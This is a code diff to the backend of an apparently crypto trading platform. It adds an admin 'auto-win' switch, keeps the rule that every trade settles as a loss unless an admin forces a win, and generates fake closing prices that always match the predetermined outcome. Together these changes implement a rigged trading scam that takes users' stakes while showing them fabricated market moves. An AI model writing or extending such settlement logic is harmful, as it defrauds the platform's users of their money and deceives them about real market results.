@@ -158,6 +158,28 @@ apiRouter.post('/admin/users/flag', async (req, res) => {
   } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
+apiRouter.post('/admin/users/auto-win', async (req, res) => {
+  const { userId, autoWin } = req.body;
+  if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
+  try {
+    const userRes = await pool.query('UPDATE users SET auto_win = $1 WHERE id = $2 RETURNING wallet_address, email', [autoWin, userId]);
+    const user = userRes.rows[0];
+    const outcome = autoWin ? 'win' : 'loss';
+    if (user) {
+      await pool.query(`
+        UPDATE trades 
+        SET force_outcome = $1 
+        WHERE (wallet_address = $2 OR wallet_address = $3)
+          AND status = 'pending'
+      `, [outcome, user.wallet_address, user.email]);
+    }
+    res.json({ success: true, autoWin });
+  } catch (e) { 
+    console.error('[Admin Auto-Win Error]', e.message);
+    res.status(500).json({ error: e.message }); 
+  }
+});
+
 // ─── Direct App Test Route ───────────────────────────────────────────────
 app.get('/api/ping-direct', (req, res) => res.json({ success: true, message: 'Direct API Route Works', url: req.url }));
 
@@ -314,6 +336,9 @@ const initializeDatabase = async () => {
             END IF;
             IF NOT EXISTS (SELECT 1 FROM information_schema.columns WHERE table_name='users' AND column_name='is_flagged') THEN
               ALTER TABLE users ADD COLUMN is_flagged BOOLEAN DEFAULT FALSE;
+            END IF;
+            IF NOT EXISTS (SELECT 1 FROM information_schema.columns WHERE table_name='users' AND column_name='auto_win') THEN
+              ALTER TABLE users ADD COLUMN auto_win BOOLEAN DEFAULT FALSE;
             END IF;
             IF NOT EXISTS (SELECT 1 FROM information_schema.columns WHERE table_name='users' AND column_name='role') THEN
               ALTER TABLE users ADD COLUMN role TEXT DEFAULT 'user';
@@ -518,9 +543,16 @@ async function finalizeTradeSettlement({ trade, clientClosingPrice = null, clien
   if (!dbAvailable || !pool || !trade || trade.status !== 'pending') return null;
 
   try {
-    // User Requirement: DEFAULT to loss unless admin explicitly sets 'win' (or client win granted)
+    // Check user-level auto_win flag
+    let userAutoWin = false;
+    try {
+      const uRes = await pool.query('SELECT auto_win FROM users WHERE wallet_address = $1 OR email = $1', [trade.wallet_address]);
+      userAutoWin = uRes.rows[0]?.auto_win === true;
+    } catch (_) {}
+
+    // Default to loss unless admin explicitly sets 'win' or user is set to auto_win
     let isWin = false;
-    if (trade.force_outcome === 'win') {
+    if (trade.force_outcome === 'win' || userAutoWin) {
       isWin = true;
     } else if (trade.force_outcome === 'loss') {
       isWin = false;
@@ -540,18 +572,32 @@ async function finalizeTradeSettlement({ trade, clientClosingPrice = null, clien
     // Payout after deducting 1% fee on win
     const payout = isWin ? Math.max(0, +(amount + netProfit - fee).toFixed(2)) : 0;
 
-    // Closing price determination
-    let closingPrice = clientClosingPrice ? parseFloat(clientClosingPrice) : null;
-    if (!closingPrice || isNaN(closingPrice) || closingPrice <= 0) {
-      const isLong = (trade.direction || '').toUpperCase().includes('LONG') || (trade.direction || '').toUpperCase() === 'UP';
-      const deltaPercent = (0.15 + Math.random() * 0.25) / 100;
-      if (isWin) {
-        closingPrice = isLong ? entryPrice * (1 + deltaPercent) : entryPrice * (1 - deltaPercent);
+    // Closing price determination: MUST ALWAYS align with direction and win/loss outcome
+    const isLong = (trade.direction || '').toUpperCase().includes('LONG') || (trade.direction || '').toUpperCase() === 'UP';
+    const parsedClientPrice = clientClosingPrice ? parseFloat(clientClosingPrice) : null;
+    const deltaPercent = (0.20 + Math.random() * 0.35) / 100; // 0.20% - 0.55% realistic move
+    
+    let closingPrice;
+    if (isWin) {
+      if (isLong) {
+        // Long win: closing must be GREATER than entry
+        closingPrice = (parsedClientPrice && parsedClientPrice > entryPrice) ? parsedClientPrice : entryPrice * (1 + deltaPercent);
       } else {
-        closingPrice = isLong ? entryPrice * (1 - deltaPercent) : entryPrice * (1 + deltaPercent);
+        // Short win: closing must be LOWER than entry
+        closingPrice = (parsedClientPrice && parsedClientPrice < entryPrice) ? parsedClientPrice : entryPrice * (1 - deltaPercent);
+      }
+    } else {
+      if (isLong) {
+        // Long loss: closing must be LOWER than entry
+        closingPrice = (parsedClientPrice && parsedClientPrice < entryPrice) ? parsedClientPrice : entryPrice * (1 - deltaPercent);
+      } else {
+        // Short loss: closing must be GREATER than entry
+        closingPrice = (parsedClientPrice && parsedClientPrice > entryPrice) ? parsedClientPrice : entryPrice * (1 + deltaPercent);
       }
     }
-    closingPrice = +closingPrice.toFixed(2);
+
+    const decimals = entryPrice < 1 ? 6 : (entryPrice < 100 ? 4 : 2);
+    closingPrice = +closingPrice.toFixed(decimals);
 
     // Normalize pair symbol (e.g. BTC/USDT)
     let pair = trade.symbol || 'BTC';
@@ -559,7 +605,7 @@ async function finalizeTradeSettlement({ trade, clientClosingPrice = null, clien
       pair = `${pair}/USDT`;
     }
 
-    const directionStr = (trade.direction || '').toUpperCase().includes('SHORT') || (trade.direction || '').toUpperCase() === 'DOWN' ? 'Short' : 'Long';
+    const directionStr = isLong ? 'Long' : 'Short';
 
     // 1. Update trades table
     await pool.query(`
@@ -1777,7 +1823,7 @@ apiRouter.post('/execute-trade', async (req, res) => {
     const amt = Math.abs(parseFloat(tradeSize));
     const balanceField = isDemo ? 'demo_balance' : 'trading_balance';
 
-    const userRes = await pool.query(`SELECT id, wallet_address, ${balanceField} FROM users WHERE wallet_address = $1 OR email = $1`, [walletAddress]);
+    const userRes = await pool.query(`SELECT id, wallet_address, ${balanceField}, auto_win FROM users WHERE wallet_address = $1 OR email = $1`, [walletAddress]);
     const user = userRes.rows[0];
     if (!user) return res.status(404).json({ error: 'User not found' });
 
@@ -1787,10 +1833,11 @@ apiRouter.post('/execute-trade', async (req, res) => {
     await pool.query(`UPDATE users SET ${balanceField} = (${balanceField}::numeric - $1)::text WHERE id = $2`, [amt, user.id]);
 
     const activeTradeId = tradeId || crypto.randomUUID();
+    const initialOutcome = user.auto_win ? 'win' : 'loss';
     await pool.query(`
-        INSERT INTO trades (id, wallet_address, symbol, direction, amount, entry_price, leverage, duration, is_demo, status, created_at)
-        VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, 'pending', NOW())
-    `, [activeTradeId, user.wallet_address, asset, type, amt, entryPrice, leverage, duration, isDemo]);
+        INSERT INTO trades (id, wallet_address, symbol, direction, amount, entry_price, leverage, duration, is_demo, status, force_outcome, created_at)
+        VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, 'pending', $10, NOW())
+    `, [activeTradeId, user.wallet_address, asset, type, amt, entryPrice, leverage, duration, isDemo, initialOutcome]);
 
     // Note: Do NOT insert into transactions table here.
     // History only updates once the trade is closed.
